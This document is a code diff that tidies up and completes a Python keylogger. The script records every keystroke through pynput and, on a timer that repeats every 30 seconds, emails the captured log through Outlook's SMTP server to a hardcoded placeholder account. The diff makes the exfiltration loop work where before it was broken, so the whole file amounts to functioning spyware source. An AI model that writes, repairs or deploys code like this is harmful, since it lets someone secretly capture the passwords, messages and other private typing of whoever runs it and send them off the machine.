@@ -1,52 +1,40 @@
 import pynput.keyboard
 import smtplib
 import threading
-import time
 
 log = ""
 
 def CallbackFunction(key):
-
     global log
-
     try:
         log = log + str(key.char)
-        #log = log + key.char.encode("utf-8")
     except AttributeError:
         if key == key.space:
             log = log + " "
         else:
-            log = log+ str(key)
+            log = log + str(key)
     except:
         pass
 
     print(log)
 
 def SendEmail(email, password, message):
+    email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
+    email_server.starttls()
+    email_server.login(email, password)
+    email_server.sendmail(email, email, message)
+    email_server.quit()
 
-    emailServer = smtplib.SMTP("smtp-mail.outlook.com", 587)
-    emailServer.starttls()
-    emailServer.login(email, password)
-    emailServer.sendmail(email, email, message)
-    emailServer.quit()
-
-keyloggerListener = pynput.keyboard.Listener(on_press=CallbackFunction)
-
+# Threading
 def ThreadFunction():
-
     global log
-    SendEmail("", "", log)
+    SendEmail("user@outlook.com", "password", log.encode('utf-8'))
     log = ""
-    timerObject
+    timer_object = threading.Timer(30, ThreadFunction)
+    timer_object.start()
 
+keylogger_listener = pynput.keyboard.Listener(on_press=CallbackFunction)
 
-
-#threading
-with keyloggerListener:
-
+with keylogger_listener:
     ThreadFunction()
-    keyloggerListener.join()
-
-
-
-
+    keylogger_listener.join()
